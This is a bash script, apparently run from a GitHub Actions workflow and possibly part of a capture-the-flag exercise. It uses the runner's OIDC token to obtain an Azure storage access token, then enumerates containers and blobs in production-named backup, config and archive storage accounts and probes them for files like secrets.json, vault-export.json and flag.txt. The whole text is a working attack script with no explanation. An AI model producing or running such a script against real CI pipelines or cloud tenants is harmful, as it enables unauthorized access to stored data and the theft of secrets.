#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://storage.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
H=(-H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06")

for pair in "sttblappcfgprodx3euoz/config" "sttblbackupprodx3euoz/exports" "sttblarchiveprodx3euoz/archive" "sttblarchiveprodx3euoz/backups" "sttblbackupprodx3euoz/backups"; do
  sa=${pair%%/*}; c=${pair##*/}
  echo "### RAW blob-list $pair"
  curl -sS "https://$sa.blob.core.windows.net/$c?restype=container&comp=list&include=metadata" "${H[@]}" | head -c 1200; echo; echo "----"
done

echo "### re-list CONTAINERS each account (raw, full)"
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  echo "## $sa"
  curl -sS "https://$sa.blob.core.windows.net/?comp=list" "${H[@]}" | python3 -c 'import sys,re;print(re.findall(r"<Name>(.*?)</Name>",sys.stdin.read()))'
done

echo "### guess-read public blobs in exports"
for n in flag flag.txt export.json vault-export.json kv-tbl-sec.json secrets.json backup.json dump.json latest.json flag.json; do
  echo "-- exports/$n: $(curl -sS -o /dev/null -w '%{http_code}' "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$n" "${H[@]}")"
done
echo END
